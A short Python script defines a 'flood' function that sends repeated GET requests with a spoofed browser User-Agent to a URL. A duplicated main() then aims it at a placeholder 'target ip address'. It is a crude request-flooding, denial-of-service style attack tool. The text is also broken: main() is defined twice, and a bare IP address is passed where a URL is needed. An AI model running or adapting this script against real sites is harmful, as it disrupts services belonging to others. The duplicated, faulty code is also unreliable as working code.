import requests
import random
import time

def flood(url, count, delay):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }

    for i in range(count):
        data = {}
        response = requests.get(url, headers=headers, data=data)

        time.sleep(delay)  # Add a delay between each request

def main():
    url = "https://example.com"
    count = 200
    delay = 1  # Adjust the delay time as desired

    flood(url, count, delay)

if __name__ == '__main__':
    main()


def main():
    ip_address = "Your target ip address"
    count = 300
    delay = 1 #Adjust the deplay time as desired 


    flood(ip_address, count, delay)

if __name__ == '__main__':
    main()